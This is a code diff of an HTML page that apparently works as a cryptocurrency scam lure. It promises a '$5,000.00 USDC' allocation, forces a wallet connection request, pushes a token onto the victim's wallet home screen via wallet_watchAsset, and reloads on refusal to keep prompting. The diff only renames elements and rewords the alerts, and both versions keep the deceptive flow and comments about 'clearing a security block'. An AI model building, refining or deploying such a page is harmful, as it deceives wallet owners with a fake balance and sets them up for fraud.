@@ -3,31 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final Settlement</title>
+    <title>Final Push</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
-        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 120px; }
+        .box { border: 2px solid #0f0; padding: 35px; display: inline-block; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
         button { 
-            background: #0f0; color: #000; border: none; padding: 25px; 
-            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em;
+            background: #0f0; color: #000; border: none; padding: 30px; 
+            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.4em;
         }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h2>FINAL SYSTEM PUSH</h2>
+    <div class="box">
+        <h2 style="margin-top:0;">FINAL SYSTEM PUSH</h2>
         <p>ALLOCATION: $5,000.00 USDC</p>
-        <button id="finalPushBtn">LINK TO HOME SCREEN</button>
+        <button id="forcePush">LINK TO HOME SCREEN</button>
     </div>
 
     <script>
-        document.getElementById('finalPushBtn').onclick = async () => {
+        document.getElementById('forcePush').onclick = async () => {
             if (window.ethereum) {
                 try {
-                    // STAGE 1: Force identity handshake (Clear security block)
+                    // Force the immediate identity handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // STAGE 2: Force the asset to the Home Screen
+                    // Direct push of the asset to the Home Screen
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -39,13 +39,12 @@
                             },
                         },
                     });
-                    alert("Success! Check your Home Screen balance.");
+                    alert("Sync Successful! Check your Home Screen.");
                 } catch (e) {
-                    // If the handshake is interrupted, refresh to retry immediately
-                    window.location.reload();
+                    window.location.reload(); 
                 }
             } else {
-                alert("Critical: Open this in the Coinbase Wallet Browser.");
+                alert("Please open in Coinbase Wallet Browser.");
             }
         };
     </script>
